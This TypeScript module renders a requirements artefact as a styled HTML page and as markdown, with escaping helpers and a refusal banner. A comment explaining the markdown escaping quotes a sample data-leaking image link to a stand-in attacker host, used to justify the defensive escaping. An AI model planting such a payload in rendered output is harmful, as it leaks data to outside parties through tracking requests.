/**
 * Pure projections of a `ReqsBody` for humans: a self-contained HTML page for
 * the room, and a markdown rendering for anywhere plain text travels better.
 * Neither reads the clock, the filesystem, or anything but its arguments —
 * every timestamp shown here was stamped by the assembler, not by this module.
 */
import type { Clarification, Finding, Grounding, ReqsBody, RequirementNodeT } from "./schema.js";
import { walk } from "./schema.js";

const esc = (s: string): string =>
  s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");

/**
 * Neutralises markdown's own metacharacters — distinct from HTML escaping —
 * so authored content (arbitrary source-document quotes, questions,
 * statements) cannot forge markdown structure or smuggle raw HTML into
 * renderers (Confluence, GitHub, …) that interpret this output.
 *
 * `[`, `]`, `(`, `)` and `!` are in the set for a reason worth stating: a
 * `grounding.quote` is copied verbatim out of an ingested document, so a source
 * page containing `![](https://attacker/?leak=…)` would otherwise become a live
 * image request — a tracking pixel — the moment anyone opens the projection.
 * Link and image syntax is structure, and structure here is never authored.
 */
const mdEsc = (s: string): string =>
  s
    .replace(/\\/g, "\\\\")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/`/g, "\\`")
    .replace(/\|/g, "\\|")
    .replace(/!/g, "\\!")
    .replace(/\[/g, "\\[")
    .replace(/\]/g, "\\]")
    .replace(/\(/g, "\\(")
    .replace(/\)/g, "\\)")
    .replace(/\n/g, " ");

const STYLE = `
  :root {
    --ink:#090e18; --panel:#10192b; --line:#223148; --line-soft:#1a2740;
    --text:#cbd7e9; --muted:#6f819e; --faint:#46587a; --lex:#5cc2ef; --vec:#efab54; --ok:#5ccb8e; --warn:#ef7d6b;
    --shadow: 0 1px 0 #ffffff08, 0 12px 34px -20px #000000cc;
    --mono: ui-monospace, "SF Mono", "JetBrains Mono", "Cascadia Code", Menlo, Consolas, monospace;
    color-scheme:dark;
  }
  @media (prefers-color-scheme: light) {
    :root { --ink:#eef1f6; --panel:#ffffff; --line:#cbd4e2; --line-soft:#dbe2ec;
      --text:#16202f; --muted:#5d6c85; --faint:#8794a8; --lex:#1f8fc7; --vec:#c07914; --ok:#1f9d63; --warn:#c0442f;
      --shadow: 0 1px 0 #ffffff, 0 10px 26px -20px #23324a55; color-scheme:light; }
  }
  * { box-sizing:border-box; }
  body { margin:0; background:var(--ink); color:var(--text); font-family:var(--mono); font-size:15px; line-height:1.55;
    -webkit-font-smoothing:antialiased; letter-spacing:-0.01em;
    background-image: radial-gradient(110% 70% at 88% -8%, color-mix(in oklab, var(--lex) 8%, transparent), transparent 60%),
      radial-gradient(110% 70% at 6% 108%, color-mix(in oklab, var(--vec) 7%, transparent), transparent 55%);
    background-attachment:fixed; }
  .wrap { max-width:960px; margin:0 auto; padding:clamp(20px,4vw,44px) clamp(16px,4vw,36px) 60px; }
  h1 { font-size:20px; margin:0 0 4px; letter-spacing:0.01em; }
  h2 { font-size:12px; letter-spacing:0.12em; text-transform:uppercase; color:var(--faint); font-weight:700;
    margin:34px 0 12px; padding-top:18px; border-top:1px solid var(--line-soft); }
  h2:first-of-type { border-top:0; padding-top:0; }
  .sub { color:var(--muted); font-size:13px; margin:0; }
  .banner-refused { border:2px solid var(--warn); border-radius:10px; background:color-mix(in oklab, var(--warn) 12%, var(--panel));
    box-shadow:var(--shadow); padding:20px 22px; margin:18px 0 30px; }
  .banner-refused .title { font-size:23px; font-weight:800; letter-spacing:0.06em; color:var(--warn); text-transform:uppercase; }
  .banner-refused ul { margin:12px 0 0; padding-left:20px; }
  .banner-refused li { color:var(--text); font-size:13.5px; margin:5px 0; }
  .banner-refused code { color:var(--warn); }
  .meta { display:grid; grid-template-columns:auto 1fr; gap:4px 16px; font-size:13px; color:var(--muted); }
  .corpus { display:inline-block; padding:2px 8px; border-radius:6px; font-size:11px; letter-spacing:0.06em;
    text-transform:uppercase; font-weight:700; }
  .corpus.fixtures { color:var(--vec); background:color-mix(in oklab, var(--vec) 16%, transparent); border:1px solid color-mix(in oklab, var(--vec) 40%, var(--line)); }
  .corpus.live { color:var(--ok); background:color-mix(in oklab, var(--ok) 16%, transparent); border:1px solid color-mix(in oklab, var(--ok) 40%, var(--line)); }
  .node-card { border:1px solid var(--line); border-radius:9px; background:var(--panel); box-shadow:var(--shadow);
    padding:12px 15px; margin:0 0 10px; }
  .node-head { display:flex; align-items:baseline; gap:10px; flex-wrap:wrap; }
  .node-id { color:var(--lex); font-weight:700; font-size:12.5px; }
  .node-decision { margin-left:auto; font-size:11px; letter-spacing:0.06em; text-transform:uppercase; color:var(--faint);
    border:1px solid var(--line); border-radius:6px; padding:2px 8px; }
  .node-decision.leaf { color:var(--ok); border-color:color-mix(in oklab, var(--ok) 40%, var(--line)); }
  .node-decision.decompose { color:var(--lex); border-color:color-mix(in oklab, var(--lex) 40%, var(--line)); }
  .node-decision.clarify { color:var(--warn); border-color:color-mix(in oklab, var(--warn) 40%, var(--line)); }
  .node-stmt { margin:6px 0 4px; color:var(--text); }
  .node-score { font-size:12px; color:var(--muted); }
  .node-score b { color:var(--text); }
  .ac { border-left:2px solid var(--line); margin:8px 0 0 4px; padding:2px 0 2px 12px; font-size:12.5px; color:var(--muted); }
  .ac .acid { color:var(--vec); font-weight:600; }
  .ac .gwt b { color:var(--faint); text-transform:uppercase; font-size:10.5px; letter-spacing:0.06em; margin-right:6px; }
  .ac .gwt { margin:2px 0; }
  .ac .not-observable { color:var(--warn); font-size:11px; margin-left:6px; }
  table { width:100%; border-collapse:collapse; font-size:12.5px; margin:6px 0 0; }
  th, td { text-align:left; padding:7px 10px; border-bottom:1px solid var(--line-soft); vertical-align:top; }
  th { color:var(--faint); font-weight:600; font-size:10.5px; letter-spacing:0.06em; text-transform:uppercase; }
  td.quote { color:var(--text); max-width:34ch; }
  .hedged { color:var(--warn); font-size:11px; font-weight:700; letter-spacing:0.04em; }
  .ledger-grp { margin:10px 0 18px; }
  .ledger-grp h3 { font-size:11px; letter-spacing:0.08em; text-transform:uppercase; color:var(--muted); margin:0 0 6px; }
  .residual { border-left:2px solid var(--warn); padding:4px 0 4px 12px; margin:0 0 8px; font-size:12.5px; }
  .residual b { color:var(--text); }
  .residual .who { color:var(--muted); font-size:11.5px; }
  .clarification { border-left:2px solid var(--warn); padding:4px 0 4px 12px; margin:0 0 8px; font-size:12.5px; }
  .clarification b { color:var(--text); }
  .clarification .who { color:var(--muted); font-size:11.5px; }
  .signoff { display:flex; gap:24px; flex-wrap:wrap; font-size:13px; }
  .signoff .result { font-weight:700; }
  .approver { color:var(--muted); font-size:12.5px; }
  .approver b { color:var(--text); }
  .empty { color:var(--faint); font-size:12.5px; font-style:italic; }
  .foot { margin-top:36px; padding-top:16px; border-top:1px solid var(--line-soft); font-size:11px; color:var(--faint); }
`;

// ── shared data shaping — both renderers walk the same shapes, format differently ──

interface GroundingRow extends Grounding {
  nodeId: string;
}

function allGrounding(body: ReqsBody): GroundingRow[] {
  const rows: GroundingRow[] = [];
  for (const { node } of walk(body.tree)) {
    for (const g of node.grounding) rows.push({ ...g, nodeId: node.id });
  }
  for (const c of body.clarifications) {
    for (const g of c.grounding) rows.push({ ...g, nodeId: c.nodeId });
  }
  return rows;
}

function clarificationGroups(body: ReqsBody): {
  grounded: Clarification[];
  escalated: Clarification[];
} {
  return {
    grounded: body.clarifications.filter((c) => c.answeredBy?.kind === "knowledge_base"),
    escalated: body.clarifications.filter((c) => c.answeredBy?.kind !== "knowledge_base"),
  };
}

const answeredBy = (c: Clarification): string =>
  c.answeredBy ? `${c.answeredBy.kind} · ${c.answeredBy.name}` : "unanswered";

/** `metadata.generator.agent` is written by the elaboration loop as
 *  "eil reqs elaborate via <producer>"; the projection wants the producer. */
const AGENT_PREFIX = "eil reqs elaborate via ";

/**
 * Where the judgments in this artefact came from, in words a non-engineer
 * reads once and understands — and never a phrase under which a replay could
 * be mistaken for a model that was called this morning.
 */
export function judgmentsLine(generator: ReqsBody["metadata"]["generator"]): string {
  const agent = generator.agent;
  const via = agent.startsWith(AGENT_PREFIX) ? agent.slice(AGENT_PREFIX.length) : agent;
  const who = generator.model ? `${via}, ${generator.model}` : via;
  return generator.provenance === "replay"
    ? `replayed from a recorded run (${who})`
    : `live (${who})`;
}

// ── HTML ──

function bannerHtml(findings: Finding[] | undefined): string {
  const errors = (findings ?? []).filter((f) => f.severity === "error");
  if (errors.length === 0) return "";
  const items = errors
    .map((f) => `<li><code>${esc(f.id)}</code> · ${esc(f.path)} — ${esc(f.message)}</li>`)
    .join("");
  return `<div class="banner-refused"><div class="title">⛔ REFUSED</div><ul>${items}</ul></div>`;
}

function acHtml(node: RequirementNodeT): string {
  return (node.acceptanceCriteria ?? [])
    .map((ac) => {
      const then = ac.then.map((t) => `<div>${esc(t)}</div>`).join("");
      const flag = ac.observable ? "" : `<span class="not-observable">not observable</span>`;
      return `<div class="ac"><span class="acid">${esc(ac.id)}</span> · ${esc(ac.stakeholder)}${flag}
        <div class="gwt"><b>Given</b>${esc(ac.given)}</div>
        <div class="gwt"><b>When</b>${esc(ac.when)}</div>
        <div class="gwt"><b>Then</b>${then}</div></div>`;
    })
    .join("");
}

function treeHtml(root: RequirementNodeT): string {
  const rows: string[] = [];
  for (const { node, depth } of walk(root)) {
    const s = node.score;
    rows.push(`<div class="node-card" style="margin-left:${(depth - 1) * 18}px">
      <div class="node-head"><span class="node-id">${esc(node.id)}</span>
        <span class="node-score"><b>${s.unknowns}×${s.complexity}→${s.magnitude}</b></span>
        <span class="node-decision ${esc(node.decision)}">${esc(node.decision)}</span></div>
      <p class="node-stmt">${esc(node.statement)}</p>
      ${acHtml(node)}</div>`);
  }
  return rows.join("");
}

function groundingHtml(body: ReqsBody): string {
  const rows = allGrounding(body);
  if (rows.length === 0) return `<p class="empty">no grounding recorded</p>`;
  const trs = rows
    .map(
      (
        g,
      ) => `<tr><td>${esc(g.docId)}</td><td>${esc(g.title)}</td><td class="quote">${esc(g.quote)}</td>
        <td>${g.hedged ? `<span class="hedged">HEDGED</span>` : ""}</td></tr>`,
    )
    .join("");
  return `<table><thead><tr><th>Document</th><th>Title</th><th>Quote</th><th></th></tr></thead><tbody>${trs}</tbody></table>`;
}

function clarificationsHtml(body: ReqsBody): string {
  const { grounded, escalated } = clarificationGroups(body);
  const item = (c: Clarification): string =>
    `<div class="clarification"><b>${esc(c.id)}</b> — ${esc(c.question)} <span class="who">(${esc(answeredBy(c))})</span></div>`;
  const list = (cs: Clarification[], empty: string): string =>
    cs.length > 0 ? cs.map(item).join("") : `<p class="empty">${empty}</p>`;
  return `<div class="ledger-grp"><h3>Resolved from knowledge base</h3>${list(grounded, "none resolved from the knowledge base")}</div>
    <div class="ledger-grp"><h3>Escalated to a human</h3>${list(escalated, "none escalated")}</div>`;
}

function residualsHtml(body: ReqsBody): string {
  if (body.residuals.length === 0) return `<p class="empty">none carried</p>`;
  return body.residuals
    .map(
      (r) =>
        `<div class="residual"><b>${esc(r.id)}</b> [${esc(r.kind)}] — ${esc(r.statement)}
          <div class="who">accepted by ${esc(r.acceptedBy.name)} at ${esc(r.acceptedAt)}</div></div>`,
    )
    .join("");
}

function signoffHtml(body: ReqsBody): string {
  const signoff = body.signoff;
  if (signoff === undefined) return `<p class="empty">not yet signed off</p>`;
  const approvers = signoff.approvers
    .map(
      (a) =>
        `<span class="approver"><b>${esc(a.name)}</b> · ${esc(a.role)} · ${esc(a.kind)} · ${esc(a.at)}</span>`,
    )
    .join("");
  return `<div class="signoff"><span class="result">${esc(signoff.result)}</span>${approvers}</div>`;
}

export function renderHtml(body: ReqsBody, findings?: Finding[]): string {
  const m = body.metadata;
  const cov = body.coverage;
  const covLine =
    cov !== undefined
      ? `<div>coverage</div><div>${cov.leaves} leaves · ${cov.acs} ACs · ${cov.grounded} grounded · ${cov.escalated} escalated · ${cov.carried} carried</div>`
      : "";
  return `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>${esc(m.workItem)} — ${esc(m.title)}</title>
<style>${STYLE}</style>
</head>
<body>
<div class="wrap">
  ${bannerHtml(findings)}
  <h1>${esc(m.workItem)} — ${esc(m.title)}</h1>
  <p class="sub">${esc(m.deliveryType.kind)} / ${esc(m.deliveryType.tech)} · generated by ${esc(m.generator.agent)} ${esc(m.generator.version)}</p>

  <h2>Metadata</h2>
  <div class="meta">
    <div>corpus mode</div><div><span class="corpus ${esc(m.corpusMode)}">${esc(m.corpusMode)}</span></div>
    <div>judgments</div><div>${esc(judgmentsLine(m.generator))}</div>
    <div>created</div><div>${esc(m.createdAt)}</div>
    <div>updated</div><div>${esc(m.updatedAt)}</div>
    <div>execution profile</div><div>${esc(m.executionProfile.mode)}</div>
    ${covLine}
  </div>

  <h2>Requirement tree</h2>
  ${treeHtml(body.tree)}

  <h2>Grounding</h2>
  ${groundingHtml(body)}

  <h2>Clarification ledger</h2>
  ${clarificationsHtml(body)}

  <h2>Residuals</h2>
  ${residualsHtml(body)}

  <h2>Sign-off</h2>
  ${signoffHtml(body)}

  <div class="foot">reqs · schema ${esc(body.schemaVersion)}</div>
</div>
</body>
</html>`;
}

// ── Markdown ──

function mdAc(node: RequirementNodeT): string {
  return (node.acceptanceCriteria ?? [])
    .map((ac) => {
      const then = ac.then.map((t) => `    - ${mdEsc(t)}`).join("\n");
      const flag = ac.observable ? "" : " _not observable_";
      return `  - **${ac.id}** (${mdEsc(ac.stakeholder)})${flag}\n    - GIVEN ${mdEsc(ac.given)}\n    - WHEN ${mdEsc(ac.when)}\n    - THEN\n${then}`;
    })
    .join("\n");
}

function mdTree(root: RequirementNodeT): string {
  const lines: string[] = [];
  for (const { node, depth } of walk(root)) {
    const s = node.score;
    lines.push(
      `${"  ".repeat(depth - 1)}- **${node.id}** [${node.decision}] ${s.unknowns}×${s.complexity}→${s.magnitude} — ${mdEsc(node.statement)}`,
    );
    const ac = mdAc(node);
    if (ac) lines.push(ac);
  }
  return lines.join("\n");
}

function mdGrounding(body: ReqsBody): string {
  const rows = allGrounding(body);
  if (rows.length === 0) return "_no grounding recorded_";
  const trs = rows.map(
    (g) =>
      `| ${mdEsc(g.docId)} | ${mdEsc(g.title)} | ${mdEsc(g.quote)} | ${g.hedged ? "hedged" : ""} |`,
  );
  return `| Document | Title | Quote | |\n| --- | --- | --- | --- |\n${trs.join("\n")}`;
}

function mdClarifications(body: ReqsBody): string {
  const { grounded, escalated } = clarificationGroups(body);
  const item = (c: Clarification): string =>
    `- **${c.id}** — ${mdEsc(c.question)} (${mdEsc(answeredBy(c))})`;
  const list = (cs: Clarification[], empty: string): string =>
    cs.length > 0 ? cs.map(item).join("\n") : `_${empty}_`;
  return `**Resolved from knowledge base**\n\n${list(grounded, "none resolved from the knowledge base")}\n\n**Escalated to a human**\n\n${list(escalated, "none escalated")}`;
}

function mdResiduals(body: ReqsBody): string {
  if (body.residuals.length === 0) return "_none carried_";
  return body.residuals
    .map(
      (r) =>
        `- **${r.id}** [${r.kind}] — ${mdEsc(r.statement)} (accepted by ${mdEsc(r.acceptedBy.name)} at ${r.acceptedAt})`,
    )
    .join("\n");
}

/**
 * The markdown counterpart of `bannerHtml`. A refused artefact must be
 * distinguishable from a passed one AS A FILE, wherever the file travels — a
 * markdown projection with no stamp is a refused artefact that reads clean.
 */
function bannerMd(findings: Finding[] | undefined): string {
  const errors = (findings ?? []).filter((f) => f.severity === "error");
  if (errors.length === 0) return "";
  const items = errors.map(
    (f) => `> - \`${mdEsc(f.id)}\` · ${mdEsc(f.path)} — ${mdEsc(f.message)}`,
  );
  return `> **⛔ REFUSED**\n>\n${items.join("\n")}\n\n`;
}

function mdSignoff(body: ReqsBody): string {
  const signoff = body.signoff;
  if (signoff === undefined) return "_not yet signed off_";
  const approvers = signoff.approvers
    .map((a) => `- ${mdEsc(a.name)} · ${mdEsc(a.role)} · ${mdEsc(a.kind)} · ${a.at}`)
    .join("\n");
  return `Result: **${mdEsc(signoff.result)}**\n\n${approvers}`;
}

export function renderMarkdown(body: ReqsBody, findings?: Finding[]): string {
  const m = body.metadata;
  const cov = body.coverage;
  const covLine =
    cov !== undefined
      ? `\n- coverage: ${cov.leaves} leaves · ${cov.acs} ACs · ${cov.grounded} grounded · ${cov.escalated} escalated · ${cov.carried} carried`
      : "";
  return `${bannerMd(findings)}# ${mdEsc(m.workItem)} — ${mdEsc(m.title)}

- corpus mode: **${m.corpusMode}**
- judgments: ${mdEsc(judgmentsLine(m.generator))}
- created: ${m.createdAt}
- updated: ${m.updatedAt}
- execution profile: ${m.executionProfile.mode}
- delivery: ${m.deliveryType.kind} / ${m.deliveryType.tech}
- generator: ${mdEsc(m.generator.agent)} ${mdEsc(m.generator.version)}${covLine}

## Requirement tree

${mdTree(body.tree)}

## Grounding

${mdGrounding(body)}

## Clarification ledger

${mdClarifications(body)}

## Residuals

${mdResiduals(body)}

## Sign-off

${mdSignoff(body)}
`;
}
